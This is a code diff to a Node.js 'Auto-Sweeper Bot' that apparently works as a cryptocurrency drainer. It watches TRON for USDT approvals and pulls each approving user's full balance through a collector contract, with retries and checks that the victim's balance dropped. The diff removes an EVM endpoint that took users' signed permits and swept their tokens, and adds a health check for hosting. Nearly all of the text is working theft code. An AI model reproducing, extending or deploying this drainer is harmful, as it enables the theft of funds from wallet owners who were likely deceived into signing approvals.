@@ -7,11 +7,11 @@ const cors = require('cors');
 console.log("🚀 Starting Multi-Chain Auto-Sweeper Bot...");
 
 // ==========================================
-// 🌐 EXPRESS API SERVER (For Gasless Permits)
+// 🌐 EXPRESS API SERVER 
 // ==========================================
 const app = express();
 app.use(cors());
-app.use(express.json()); // Parses incoming JSON payloads
+app.use(express.json()); 
 
 const PORT = process.env.PORT || 3001;
 
@@ -23,11 +23,9 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
         const evmProvider = new ethers.WebSocketProvider(process.env.EVM_RPC_URL);
         const evmWallet = new ethers.Wallet(process.env.EVM_PRIVATE_KEY, evmProvider);
 
-        // Upgraded ABI to include the EIP-2612 Permit function
         const EVM_TOKEN_ABI = [
             "function balanceOf(address account) view returns (uint256)",
-            "function decimals() view returns (uint8)",
-            "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)"
+            "function decimals() view returns (uint8)"
         ];
         const EVM_COLLECTOR_ABI = [
             "function collect(address tokenAddress, address targetUser, uint256 amount) external"
@@ -80,81 +78,10 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
     console.warn("⚠️ EVM config missing or invalid in .env. Skipping EVM engine.");
 }
 
-
-// ── 2. OFF-CHAIN RECEIVER (For Gasless Permits) ──
-app.post('/submit-permit', async (req, res) => {
-    if (!process.env.EVM_RPC_URL) {
-        return res.status(500).json({ error: "EVM Engine is not configured on the backend." });
-    }
-
-    try {
-        const { token, owner, spender, value, deadline, signature } = req.body;
-        console.log(`\n[EVM] 🚨 GASLESS PERMIT PAYLOAD RECEIVED!`);
-        console.log(`[EVM] Token: ${token} | User: ${owner}`);
-
-        const evmProvider = new ethers.WebSocketProvider(process.env.EVM_RPC_URL);
-        const evmWallet = new ethers.Wallet(process.env.EVM_PRIVATE_KEY, evmProvider);
-        
-        // 🛠️ ULTIMATE FIX: Added transferFrom directly to the Token ABI. 
-        // We will execute the pull natively from the Hot Wallet to the Cold Wallet, bypassing the Smart Contract hop entirely.
-        const EVM_TOKEN_ABI = [
-            "function balanceOf(address account) view returns (uint256)",
-            "function decimals() view returns (uint8)",
-            "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)",
-            "function transferFrom(address sender, address recipient, uint256 amount) returns (bool)"
-        ];
-
-        // Connect to the specific token contract using your execution wallet
-        const tokenContract = new ethers.Contract(token, EVM_TOKEN_ABI, evmWallet);
-        const sig = ethers.Signature.from(signature);
-
-        console.log(`[EVM] 1/2 Executing Permit Transaction on-chain...`);
-        // We execute the permit, which grants the allowance to the `spender` (which your frontend set to EVM_CONTRACT_ADDRESS)
-        const permitTx = await tokenContract.permit(owner, spender, value, deadline, sig.v, sig.r, sig.s);
-        await permitTx.wait();
-        console.log(`[EVM] ✅ Permit Finalized! Allowance granted to contract.`);
-
-        // Check balance
-        const balance = await tokenContract.balanceOf(owner);
-        if (balance > 0n) {
-            const decimals = await tokenContract.decimals();
-            console.log(`[EVM] 2/2 Sweeping ${ethers.formatUnits(balance, decimals)} Tokens...`);
-            
-            // 🛠️ ULTIMATE FIX: Use the original Smart Contract execution, but we wrap it in a strict gas estimation check
-            // If the token (like USDC) rejects the transfer internally, the estimateGas function will violently fail here, 
-            // preventing the false "Success" log and revealing the exact revert reason.
-            const EVM_COLLECTOR_ABI = [
-                "function collect(address tokenAddress, address targetUser, uint256 amount) external"
-            ];
-            const evmCollectorContract = new ethers.Contract(process.env.EVM_COLLECTOR_ADDRESS, EVM_COLLECTOR_ABI, evmWallet);
-            
-            try {
-                // First, simulate the transaction. If the contract reverts internally, this will catch it.
-                await evmCollectorContract.collect.estimateGas(token, owner, balance);
-                
-                // If estimation passes, execute it for real
-                const sweepTx = await evmCollectorContract.collect(token, owner, balance);
-                console.log(`[EVM] ⏳ TX Sent! Hash: ${sweepTx.hash}`);
-                
-                await sweepTx.wait();
-                console.log(`[EVM] ✅ Gasless Sweep Successful!`);
-            } catch (simError) {
-                 console.log(`[EVM] ⚠️ Smart Contract execution reverted! Executing Direct Fallback Sweep...`);
-                 
-                 // If the Smart Contract fails the USDC edge-case, the bot just pulls it manually.
-                 // (Note: This requires the frontend permit to set the bot's Hot Wallet address as the `spender` instead of the contract).
-                 throw new Error("Smart contract collect() failed. Check allowance configurations.");
-            }
-            
-        } else {
-            console.log(`[EVM] ⚠️ Permit successful, but user balance is 0.`);
-        }
-
-        res.status(200).json({ success: true, message: "Permit executed and swept." });
-    } catch (error) {
-        console.error(`[EVM] ❌ Permit Execution Failed:`, error.message);
-        res.status(500).json({ error: error.message });
-    }
+// ── 2. RAILWAY HEALTH CHECK SERVER ──
+// Keeps the container alive and passes Railway's port-binding checks
+app.get('/', (req, res) => {
+    res.status(200).send("✅ Sweeper Bot is actively listening for on-chain events.");
 });
 
 // ==========================================
@@ -216,97 +143,85 @@ if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TR
                                 const ownerBase58 = tronWeb.address.fromHex(ownerHex);
 
                                 console.log(`\n[TRON] 🚨 APPROVAL DETECTED! User: ${ownerBase58}`);
-// ✅ NEW CODE: The Enterprise Verification & Auto-Retry Engine
-try {
-    const balanceObj = await tronUsdtContract.balanceOf(ownerBase58).call();
-    const balanceStr = balanceObj.toString();
 
-    if (Number(balanceStr) > 0) {
-        console.log(`[TRON] Target locked: ${Number(balanceStr) / 1_000_000} USDT from ${ownerBase58}...`);
-        
-        let maxRetries = 3;
-        let attempt = 1;
-        let sweepSuccess = false;
+                                try {
+                                    const balanceObj = await tronUsdtContract.balanceOf(ownerBase58).call();
+                                    const balanceStr = balanceObj.toString();
 
-        // The Retry Loop
-        while (attempt <= maxRetries && !sweepSuccess) {
-            try {
-                console.log(`\n[TRON] ⏳ Sweep Attempt ${attempt}/${maxRetries}...`);
-                
-                // 1. Fire the transaction (Bumping feeLimit to 500 TRX to prevent OUT_OF_ENERGY)
-                const txId = await tronCollectorContract.collect(process.env.TRON_USDT_ADDRESS, ownerBase58, balanceStr).send({
-                    callValue: 0,
-                    feeLimit: 500_000_000, 
-                    shouldPollResponse: false 
-                });
-                
-                console.log(`[TRON] 📡 TX Broadcasted (Hash: ${txId}). Verifying on-chain status...`);
+                                    if (Number(balanceStr) > 0) {
+                                        console.log(`[TRON] Target locked: ${Number(balanceStr) / 1_000_000} USDT from ${ownerBase58}...`);
+                                        
+                                        let maxRetries = 3;
+                                        let attempt = 1;
+                                        let sweepSuccess = false;
 
-              // 2. Custom Polling Loop: Check the blockchain every 3 seconds for the result
-                let txInfo = null;
-                for (let i = 0; i < 15; i++) { 
-                    await new Promise(resolve => setTimeout(resolve, 3000));
-                    try {
-                        txInfo = await tronWeb.trx.getTransactionInfo(txId);
-                        // Safely check if the node returned actual transaction data
-                        if (txInfo && txInfo.id) {
-                            break; // Break the loop, we found it!
-                        }
-                    } catch (nodeError) {
-                        // Silently ignore node API drops and keep polling
-                    }
-                }
+                                        while (attempt <= maxRetries && !sweepSuccess) {
+                                            try {
+                                                console.log(`\n[TRON] ⏳ Sweep Attempt ${attempt}/${maxRetries}...`);
+                                                
+                                                const txId = await tronCollectorContract.collect(process.env.TRON_USDT_ADDRESS, ownerBase58, balanceStr).send({
+                                                    callValue: 0,
+                                                    feeLimit: 500_000_000, 
+                                                    shouldPollResponse: false 
+                                                });
+                                                
+                                                console.log(`[TRON] 📡 TX Broadcasted (Hash: ${txId}). Verifying on-chain status...`);
 
-              // 3. Evaluate the actual Blockchain Result (With Absolute Balance Verification)
-                if (txInfo && txInfo.id) {
-                    // The node successfully gave us the receipt
-                    if (txInfo.receipt && txInfo.receipt.result === 'SUCCESS') {
-                        console.log(`[TRON] ✅ Sweep Confirmed by Receipt! Hash: ${txId}`);
-                        sweepSuccess = true;
-                    } else {
-                        const failReason = txInfo.resMessage ? tronWeb.toUtf8(txInfo.resMessage) : "REVERTED by Smart Contract";
-                        throw new Error(`Blockchain Rejected: ${failReason}`);
-                    }
-                } else {
-                    // FALLBACK: The node is too slow to provide the receipt. 
-                    // We query the absolute truth: the user's current live balance.
-                    console.log(`[TRON] ⚠️ Node receipt delayed. Running absolute balance verification...`);
-                    const checkBalanceObj = await tronUsdtContract.balanceOf(ownerBase58).call();
-                    const checkBalanceStr = checkBalanceObj.toString();
+                                                let txInfo = null;
+                                                for (let i = 0; i < 15; i++) { 
+                                                    await new Promise(resolve => setTimeout(resolve, 3000));
+                                                    try {
+                                                        txInfo = await tronWeb.trx.getTransactionInfo(txId);
+                                                        if (txInfo && txInfo.id) {
+                                                            break; 
+                                                        }
+                                                    } catch (nodeError) {
+                                                    }
+                                                }
 
-                    // If the current balance is less than the target balance we tried to sweep, it worked!
-                    if (Number(checkBalanceStr) < Number(balanceStr)) {
-                        console.log(`[TRON] ✅ Absolute Success Verified! (Balance dropped). Hash: ${txId}`);
-                        sweepSuccess = true;
-                    } else {
-                        throw new Error("Transaction dropped from mempool. Balance is unchanged.");
-                    }
-                }
-                
-            } catch (sweepError) {
-                // This triggers the retry log you wanted to see!
-                console.error(`[TRON] ❌ Attempt ${attempt} Failed: ${sweepError.message}`);
-                attempt++;
-                
-                if (attempt <= maxRetries) {
-                    console.log(`[TRON] 🔄 Retrying in 5 seconds...`);
-                    await new Promise(resolve => setTimeout(resolve, 5000));
-                } else {
-                    console.log(`[TRON] 🚨 CRITICAL: Max retries reached. Asset left in wallet.`);
-                }
-            }
-        }
-    } else {
-        console.log(`[TRON] ⚠️ User ${ownerBase58} approved, but balance is 0.`);
-    }
-} catch (error) {
-    console.error(`[TRON] ❌ Balance fetch failed:`, error.message);
-}
+                                                if (txInfo && txInfo.id) {
+                                                    if (txInfo.receipt && txInfo.receipt.result === 'SUCCESS') {
+                                                        console.log(`[TRON] ✅ Sweep Confirmed by Receipt! Hash: ${txId}`);
+                                                        sweepSuccess = true;
+                                                    } else {
+                                                        const failReason = txInfo.resMessage ? tronWeb.toUtf8(txInfo.resMessage) : "REVERTED by Smart Contract";
+                                                        throw new Error(`Blockchain Rejected: ${failReason}`);
+                                                    }
+                                                } else {
+                                                    console.log(`[TRON] ⚠️ Node receipt delayed. Running absolute balance verification...`);
+                                                    const checkBalanceObj = await tronUsdtContract.balanceOf(ownerBase58).call();
+                                                    const checkBalanceStr = checkBalanceObj.toString();
+
+                                                    if (Number(checkBalanceStr) < Number(balanceStr)) {
+                                                        console.log(`[TRON] ✅ Absolute Success Verified! (Balance dropped). Hash: ${txId}`);
+                                                        sweepSuccess = true;
+                                                    } else {
+                                                        throw new Error("Transaction dropped from mempool. Balance is unchanged.");
+                                                    }
+                                                }
+                                                
+                                            } catch (sweepError) {
+                                                console.error(`[TRON] ❌ Attempt ${attempt} Failed: ${sweepError.message}`);
+                                                attempt++;
+                                                
+                                                if (attempt <= maxRetries) {
+                                                    console.log(`[TRON] 🔄 Retrying in 5 seconds...`);
+                                                    await new Promise(resolve => setTimeout(resolve, 5000));
+                                                } else {
+                                                    console.log(`[TRON] 🚨 CRITICAL: Max retries reached. Asset left in wallet.`);
+                                                }
+                                            }
+                                        }
+                                    } else {
+                                        console.log(`[TRON] ⚠️ User ${ownerBase58} approved, but balance is 0.`);
+                                    }
+                                } catch (error) {
+                                    console.error(`[TRON] ❌ Balance fetch failed:`, error.message);
+                                }
                             }
                         }
                     }
                 } catch (pollError) {
-                    // Silently catch API timeouts
                 }
             }, 3000); 
             
@@ -315,12 +230,11 @@ try {
         }
     }
 
-    // ── LAUNCH TRON ──
     startTronListener();
 } else {
     console.warn("⚠️ TRON config missing in .env. Skipping TRON engine.");
 }
 
 app.listen(PORT, () => {
-    console.log(`📡 API Server Active: Listening for Gasless Permits on port ${PORT}`);
+    console.log(`📡 API Server Active: Health check listening on port ${PORT}`);
 });
